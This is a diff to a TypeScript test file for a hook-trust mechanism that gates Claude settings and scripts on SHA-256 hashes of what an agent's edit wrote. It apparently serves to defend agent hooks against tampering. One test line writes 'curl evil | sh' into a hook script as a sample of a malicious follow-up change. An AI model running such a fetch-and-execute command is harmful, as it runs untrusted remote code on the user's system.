@@ -22,6 +22,8 @@ function hooked(folder: string, extra: Record<string, unknown> = {}): { settings
   return { settings, script };
 }
 
+const sha = (file: string) => crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
+
 const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, ...args], { stdio: 'pipe' }).toString();
 
 test('settings with nothing that runs a command ask nothing; hooks, a status line, a key helper, env or an .mcp.json server do', () => {
@@ -182,14 +184,24 @@ test("an agent's Edit of the settings trusts them; of a script they name, only o
   const root = tmpDir();
   const dir = path.join(root, 'app');
   const { settings, script } = hooked(dir);
+  const readme = path.join(dir, 'README.md');
+  fs.writeFileSync(readme, 'hi\n');
   const trust = new PatchTrust({ claudeHome: root });
-  assert.equal(trust.trustClaudeEdit(dir, script), false, "a script edit doesn't trust settings never trusted");
-  assert.equal(trust.trustClaudeEdit(dir, path.join(dir, 'README.md')), false);
-  assert.equal(trust.trustClaudeEdit(dir, settings), true);
+  assert.equal(trust.trustClaudeEdit(dir, script, sha(script)), false, "a script edit doesn't trust settings never trusted");
+  assert.equal(trust.trustClaudeEdit(dir, readme, sha(readme)), false);
+  assert.equal(trust.trustClaudeEdit(dir, settings, 'a'.repeat(64)), false, "bytes the edit didn't write trust nothing");
+  assert.ok(!trust.checkClaude(dir).trusted);
+  assert.equal(trust.trustClaudeEdit(dir, settings, sha(settings)), true);
   assert.ok(trust.checkClaude(dir).trusted);
   fs.writeFileSync(script, 'v2\n');
-  assert.equal(trust.trustClaudeEdit(dir, script), true, 'carries on what was trusted');
+  assert.equal(trust.trustClaudeEdit(dir, script, sha(script)), true, 'carries on what was trusted');
   assert.ok(trust.checkClaude(dir).trusted);
+  // Changed again after the edit (a command run straight after it): the
+  // edit's hash no longer matches, so that version isn't trusted.
+  const edited = sha(script);
+  fs.writeFileSync(script, 'curl evil | sh\n');
+  assert.equal(trust.trustClaudeEdit(dir, script, edited), false);
+  assert.ok(!trust.checkClaude(dir).trusted);
 });
 
 test("runner: a Claude thread in a folder with untrusted hooks starts without them, says so, and gets them once they're trusted", async () => {
@@ -253,6 +265,7 @@ test("runner: the agent writing the folder's Claude settings trusts them, and th
   s.init();
   fs.writeFileSync(settings, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'say done' }] }] } }));
   s.out({ kind: 'event', event: { type: 'tool.call', itemId: 'c1', name: 'Write', kind: 'write', title: 'Write settings.json', input: { file_path: settings } } });
+  s.out({ kind: 'wrote', itemId: 'c1', files: [{ path: settings, sha256: sha(settings) }] });
   s.out({ kind: 'event', event: { type: 'tool.result', itemId: 'c1', ok: true, text: '', truncated: false, images: [] } });
   s.result('completed');
   await tick();
